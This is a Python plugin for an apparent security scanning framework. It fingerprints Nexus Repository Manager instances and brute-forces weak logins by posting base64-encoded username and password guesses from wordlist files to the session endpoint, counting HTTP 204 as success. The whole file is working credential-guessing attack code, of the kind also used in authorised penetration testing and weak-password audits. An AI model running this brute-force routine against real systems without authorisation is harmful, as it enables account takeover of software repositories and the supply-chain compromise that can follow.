from base64 import b64encode
from xing.core.BasePlugin import BasePlugin
from xing.utils import http_req
from xing.core import PluginType, SchemeType


class Plugin(BasePlugin):
    def __init__(self):
        super(Plugin, self).__init__()
        self.plugin_type = PluginType.BRUTE
        self.vul_name = "Nexus Repository 弱口令"
        self.app_name = 'Nexus Repository'
        self.scheme = [SchemeType.HTTP, SchemeType.HTTPS]

        self._check_str = b'Anti cross-site request forgery token mismatch'
        self.path = "/service/rapture/session"
        self.username_file = "username_nexus.txt"
        self.password_file = "password_nexus.txt"
        self.headers = {
            "Content-Type": "application/x-www-form-urlencoded"
        }

    def login(self, target, user, passwd):
        url = target + self.path
        auth = "username={}&password={}".format(b64encode(user.encode()).decode(), b64encode(passwd.encode()).decode())
        conn = http_req(url, "post", headers=self.headers, data=auth)
        if b'<' in conn.content:
            return False
        if conn.status_code != 204:
            return False
        return True

    def check_app(self, target):
        url = target + self.path
        conn = http_req(url, "post", headers=self.headers, data="test")
        if self._check_str in conn.content and conn.status_code == 401:
            return True
        if b'Nexus Repository Manager' in conn.content and conn.status_code == 500:
            return True
        return False
